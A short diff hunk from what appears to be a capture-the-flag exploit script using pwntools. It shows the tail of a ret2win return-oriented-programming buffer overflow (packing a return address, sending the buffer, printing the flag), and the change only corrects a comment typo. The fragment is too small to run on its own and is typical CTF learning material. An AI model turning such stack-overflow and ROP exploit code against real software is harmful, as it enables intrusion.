@@ -35,4 +35,4 @@ buf += p64(RET2WIN) # Return to ret2win()
 buf += p64(0xdeadbeef) # End of ROP chain marker :D
 
 p.send(buf) # Send buffer
-sys.stdout.write(p.recvall()) # Recieve flag :D
+sys.stdout.write(p.recvall()) # Receive flag :D
